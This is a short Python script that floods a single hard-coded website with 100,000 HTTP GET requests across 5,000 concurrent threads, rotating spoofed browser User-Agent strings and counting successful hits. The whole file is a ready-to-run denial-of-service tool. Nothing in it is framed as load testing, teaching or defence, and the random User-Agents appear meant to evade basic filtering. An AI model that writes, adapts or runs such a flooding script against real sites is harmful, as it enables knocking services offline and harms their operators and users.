import requests
import random
from concurrent.futures import ThreadPoolExecutor
import threading

# Shared counter variable for successful requests
success_counter = 0
counter_lock = threading.Lock()

# Function to send HTTP request with a random User-Agent
def send_request(url):
    global success_counter
    
    try:
        user_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 11; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Mobile Safari/537.36",
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 640 XL LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36 Edge/13.10586",
"Mozilla/5.0 (Linux; U; Android 12; en-us; SM-G998U Build/JK9871) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.88 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; U; Android 11; en-us; SM-G998U Build/JK9871) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.88 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 11; en-us; SM-A715F Build/RQ3A.210805.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.88 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A515F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 GSA/12.37.9.23.arm64",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G970F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.88 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 YaBrowser/21.6.3.757 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Safari/537.36 Edg/99.0.1150.20",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Safari/537.36 OPR/78.0.4093.147",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Safari/537.36 Edge/99.0.1150.20",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Safari/537.36 Avast/99.0.1150.24",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Safari/537.36 789abc/99.0.1150.24",
        ]
        
        # Choose a random User-Agent from the list
        user_agent = random.choice(user_agents)
        
        # Set the User-Agent header
        headers = {"User-Agent": user_agent}
        
        # Send GET request with the specified User-Agent
        response = requests.get(url, headers=headers)
        
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            with counter_lock:
                success_counter += 1
            print(f"{success_counter} Request to {url} with User-Agent {user_agent} successful")
            # Process response data if needed
        else:
            print(f"Request to {url} with User-Agent {user_agent} failed with status code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while sending request to {url}: {e}")

def main():
    # Define the URL
    url = 'http://hacking122.rf.gd'
    
    # Number of times to send the request
    num_requests = 100000
    
    # Maximum number of workers
    max_workers = 5000
    
    # Create a ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit requests
        for _ in range(num_requests):
            executor.submit(send_request, url)
    
    # Print the total number of successful requests
    print(f"Total successful requests: {success_counter}")

if __name__ == "__main__":
    main()
